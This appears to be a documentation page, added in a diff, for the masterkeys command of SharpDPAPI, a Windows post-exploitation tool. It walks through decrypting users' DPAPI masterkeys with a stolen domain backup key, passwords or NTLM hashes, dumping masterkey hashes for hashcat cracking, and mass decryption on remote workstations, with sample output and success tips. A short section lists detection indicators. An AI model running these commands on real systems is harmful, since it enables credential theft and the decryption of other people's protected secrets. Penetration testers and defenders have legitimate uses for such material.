@@ -1,0 +1,262 @@
+---
+title: 'masterkeys'
+description: 'Decrypt and extract user DPAPI masterkey files'
+icon: 'key'
+---
+
+## Overview
+
+The **masterkeys** command searches for user masterkey files and decrypts them using a domain DPAPI backup key or user credentials. It returns {GUID}:SHA1 mappings that can be used with other commands for decryption.
+
+<Info>
+  Masterkeys are the intermediate encryption keys used by DPAPI. Once decrypted, they can decrypt any DPAPI-protected data for that user.
+</Info>
+
+## Basic Usage
+
+```bash
+# Decrypt masterkeys with domain backup key
+SharpDPAPI.exe masterkeys /pvk:key.pvk
+
+# Decrypt masterkeys with user password
+SharpDPAPI.exe masterkeys /password:Password123!
+
+# Dump masterkey hashes for offline cracking
+SharpDPAPI.exe masterkeys /hashes
+```
+
+## Command Arguments
+
+### Decryption Methods
+
+| Argument | Description |
+|----------|-------------|
+| `/pvk:BASE64...` | Base64-encoded domain DPAPI backup key |
+| `/pvk:key.pvk` | Domain backup key file |
+| `/password:X` | User's plaintext password |
+| `/ntlm:X` | User's NTLM hash |
+| `/credkey:X` | DPAPI credkey (SHA1 from Mimikatz sekurlsa::msv) |
+| `/rpc` | Decrypt by asking domain controller |
+
+### Targeting Options
+
+| Argument | Description |
+|----------|-------------|
+| `/target:FILE` | Target specific masterkey file |
+| `/target:FOLDER` | Target specific folder of masterkeys |
+| `/server:SERVER` | Target remote server (requires pvk or password) |
+
+### Output Options
+
+| Argument | Description |
+|----------|-------------|
+| `/hashes` | Output masterkey hashes in John/Hashcat format (no decryption) |
+
+<Warning>
+  When using `/password` with `/target`, you must also specify the `/sid:X` parameter with the user's full domain SID.
+</Warning>
+
+## What Are Masterkeys?
+
+Masterkeys are stored in the user's profile at:
+```
+%APPDATA%\Microsoft\Protect\<USER-SID>\<MASTERKEY-GUID>
+```
+
+Each user typically has multiple masterkey files. The `Preferred` file indicates which masterkey is currently in use.
+
+## Example: Decrypt with Domain Backup Key
+
+```bash
+SharpDPAPI.exe masterkeys /pvk:key.pvk
+```
+
+**Output:**
+```
+[*] Action: Triage User Masterkey Files
+
+[*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
+[*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a
+
+[*] User master key cache:
+
+{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
+{feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903a9b61c42e6c9ab0f4
+{8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd3a230f5e04f70fd02be69e2e71f1b017
+```
+
+<Tip>
+  Save these {GUID}:SHA1 mappings to a file. You can use them with `/mkfile:masterkeys.txt` in other commands.
+</Tip>
+
+## Example: Extract Masterkey Hashes
+
+```bash
+SharpDPAPI.exe masterkeys /hashes
+```
+
+**Output:**
+```
+[*] Action: User DPAPI Masterkey File Triage
+
+[*] Will dump user masterkey hashes
+
+[*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
+
+[*] Preferred master keys:
+
+C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
+
+[*] User master key hashes:
+
+{42e95117-ff5f-40fa-a6fc-87584758a479}:$DPAPImk$1*3*S-1-5-21-1473254003-2681465353-4059813368-1000*des3*sha1*18000*09c49e9af9...
+```
+
+<Note>
+  Focus on cracking the "preferred" masterkeys first - these are the currently active keys for each user.
+</Note>
+
+## Example: Decrypt with User Password
+
+```bash
+# For domain-joined machines (plaintext or NTLM)
+SharpDPAPI.exe masterkeys /password:Password123!
+
+# With specific target
+SharpDPAPI.exe masterkeys /target:C:\Path\To\Masterkey\Folder /password:Password123! /sid:S-1-5-21-883232822-274137685-4173207997-1111
+```
+
+## Offline Masterkey Cracking
+
+<Steps>
+  <Step title="Extract Hashes">
+    ```bash
+    SharpDPAPI.exe masterkeys /hashes > masterkeys.txt
+    ```
+  </Step>
+
+  <Step title="Crack with Hashcat">
+    ```bash
+    hashcat -m 15300 masterkeys.txt wordlist.txt
+    ```
+  </Step>
+
+  <Step title="Use Cracked Passwords">
+    ```bash
+    SharpDPAPI.exe credentials /password:CrackedPassword!
+    ```
+  </Step>
+</Steps>
+
+## Using Decrypted Masterkeys
+
+Once you have the {GUID}:SHA1 mappings, use them with other commands:
+
+```bash
+# Save to file
+{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
+{feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903a9b61c42e6c9ab0f4
+
+# Use with other commands
+SharpDPAPI.exe credentials /mkfile:masterkeys.txt
+SharpDPAPI.exe vaults /mkfile:masterkeys.txt
+SharpDPAPI.exe triage /mkfile:masterkeys.txt
+```
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Domain Admin - Mass Decryption">
+    ```bash
+    # Get backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # Decrypt all masterkeys locally
+    SharpDPAPI.exe masterkeys /pvk:key.pvk
+
+    # Decrypt masterkeys on remote systems
+    SharpDPAPI.exe masterkeys /pvk:key.pvk /server:workstation.domain.com
+    ```
+  </Accordion>
+
+  <Accordion title="Known User Password">
+    ```bash
+    # Decrypt current user's masterkeys
+    SharpDPAPI.exe masterkeys /password:Password123!
+
+    # Decrypt specific user's masterkeys (need SID)
+    SharpDPAPI.exe masterkeys /target:C:\Users\john\AppData\Roaming\Microsoft\Protect\S-1-5-21-... /password:Password123! /sid:S-1-5-21-...
+    ```
+  </Accordion>
+
+  <Accordion title="Offline Analysis">
+    ```bash
+    # Dump hashes from copied masterkey files
+    SharpDPAPI.exe masterkeys /target:C:\Evidence\Protect\S-1-5-21-... /hashes
+
+    # Crack offline with hashcat
+    hashcat -m 15300 -a 0 masterkeys.txt rockyou.txt
+
+    # Use cracked password
+    SharpDPAPI.exe masterkeys /target:C:\Evidence\Protect\S-1-5-21-... /password:recovered_password
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Masterkey File Structure
+
+Each masterkey file is encrypted and contains:
+- **GUID**: Unique identifier for the masterkey
+- **Encryption**: Uses user's password/hash-derived key
+- **SHA1 Hash**: Decrypted masterkey value
+- **Domain Backup**: Can be decrypted with domain backup key
+
+## Detection Considerations
+
+**Host-Based Indicators:**
+- Reading files from `%APPDATA%\Microsoft\Protect\` directories
+- Bulk enumeration of masterkey files
+- Non-standard processes accessing DPAPI protected data
+
+**Network Indicators:**
+- SMB access to user profile directories on remote systems
+- RPC calls to domain controller for `/rpc` decryption
+- Access to SYSVOL for domain backup key retrieval
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain DPAPI backup key
+  </Card>
+  <Card title="credentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/credentials">
+    Decrypt credentials using masterkeys
+  </Card>
+  <Card title="triage" icon="list-check" href="/ghostpack-docs/SharpDPAPI-mdx/commands/triage">
+    Comprehensive DPAPI data extraction
+  </Card>
+  <Card title="machinemasterkeys" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/machinemasterkeys">
+    Decrypt machine masterkeys
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Maximizing Success">
+  - Always check for the "Preferred" masterkey - it's the active one
+  - Domain backup key works for all domain users across the entire domain
+  - Masterkey hashes can be cracked offline if you have password lists
+  - Save {GUID}:SHA1 mappings to avoid re-running masterkey decryption
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **No masterkeys decrypted:**
+  - Verify backup key or password is correct
+  - Check user SID matches the Protect folder path
+  - Ensure you have read access to the masterkey files
+
+  **Partial decryption:**
+  - Users may have multiple masterkeys from different time periods
+  - Focus on the "Preferred" masterkey for current data
+  - Older masterkeys may use different user passwords
+</Accordion>
